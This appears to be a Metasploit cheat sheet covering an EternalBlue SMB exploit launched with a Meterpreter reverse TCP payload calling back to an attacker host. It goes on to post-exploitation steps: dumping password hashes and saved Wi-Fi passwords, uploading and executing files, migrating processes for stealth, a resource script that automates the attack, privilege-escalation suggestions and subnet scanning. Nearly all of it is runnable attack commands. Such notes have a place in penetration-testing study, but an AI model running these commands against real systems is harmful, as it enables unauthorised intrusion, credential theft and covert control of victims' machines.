
---

## 1. Before Getting Meterpreter Shell — Setup and Exploit Launch
```
# Start Metasploit Console
msfconsole

# Select the exploit module (example: EternalBlue SMB)
use exploit/windows/smb/ms17_010_eternalblue

# Set the target IP address
set RHOSTS 192.168.1.10

# Set your local IP for the reverse shell callback
set LHOST 192.168.1.5

# Choose a payload (64-bit Windows Meterpreter reverse TCP)
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Optionally set a port (default 4444)
set LPORT 4444

# Check exploit options
show options

# Launch the exploit
exploit
```

## 2. After Getting a Meterpreter Shell
```
# Meterpreter prompt appears:
meterpreter >

# Get system info
sysinfo

# Capture screenshot
screenshot

# Dump password hashes
hashdump

# Upload a file to target
upload /path/to/local/file.exe C:\\Windows\\Temp\\file.exe

# Execute a command on target shell
execute -f cmd.exe -c

# Dump saved Wi-Fi passwords (if admin)
run post/windows/gather/wifi_passwords

# Migrate to another process for stealth
ps       # list processes
migrate <pid> 

# Get a command shell
shell

# Background the session (return to msfconsole)
background
```

## 3. Automating Meterpreter with Resource Scripts

Save repeated commands in a `.rc` script:
```
# example.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LPORT 4444
exploit
```

Run with:
```
msfconsole -r example.rc
```

If you already have a Meterpreter shell on the target system, you can use the

```
multi/recon/local_exploit_suggester
```

module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

###  Target Network using Metasploit

We need to configure metasploit db

```
service postgresql start  
msfconsole  
db_status  
  
msfdb init  
  
service postgresql restart  

db_status
```

Here, we are scanning the whole subnet 10.10.1.0/24 for active hosts.

```
nmap -Pn -sS -A -oX Test 10.10.1.0/24  
  
db_import Test
```

Type **hosts** and hit Enter to view the list of active hosts along with their MAC addresses, OS names, etc. Type **services** or **db_services** and hit Enter to receive a list of the services running on the active hosts.
